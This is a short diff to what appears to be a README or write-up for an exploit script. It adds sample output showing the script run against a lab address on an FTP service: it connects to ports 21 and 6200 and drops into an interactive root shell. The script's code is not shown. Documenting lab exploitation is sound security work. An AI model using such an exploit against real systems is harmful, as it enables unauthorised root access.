@@ -77,6 +77,15 @@ chmod +x exploit.py
 ```bash
 python3 exploit.py 172.17.0.2
 ```
-
+```bash
+❯ python3 exploit.py 172.17.0.2
+[+] Got Shell!!!
+[+] Opening connection to 172.17.0.2 on port 21: Done
+[*] Closed connection to 172.17.0.2 port 21
+[+] Opening connection to 172.17.0.2 on port 6200: Done
+[*] Switching to interactive mode
+$ whoami
+root
+```
 
 
